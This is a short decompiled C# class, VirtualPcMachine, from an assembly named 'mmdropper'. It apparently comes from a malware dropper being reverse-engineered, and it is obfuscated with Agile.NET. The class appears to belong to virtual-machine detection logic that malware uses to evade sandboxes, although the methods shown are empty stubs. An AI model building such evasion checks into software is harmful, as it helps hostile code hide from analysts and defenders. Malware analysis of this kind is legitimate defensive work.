// Decompiled with JetBrains decompiler
// Type: VirtualPcMachine
// Assembly: mmdropper, Version=1.0.7321.42228, Culture=neutral, PublicKeyToken=null
// MVID: 67C14436-991D-42DC-A31E-001F369439CC
// Assembly location: C:\Users\victim\Documents\GitHub\MrsMajor5.0\AgileStringDecryptor-master\bin\Debug\net48\eulascr-Utf8Fixed.exe

using System.Collections.Generic;
using System.Runtime.CompilerServices;

internal class VirtualPcMachine : BaseVirtualEnvironment
{
  public override string Name
  {
    [MethodImpl(MethodImplOptions.NoInlining)] get => (string) null;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public override bool ContainsProcess(IEnumerable<string> services) => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public VirtualPcMachine()
  {
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static VirtualPcMachine()
  {
    AgileDotNetRT.Initialize();
    AgileDotNetRT.PostInitialize();
  }
}
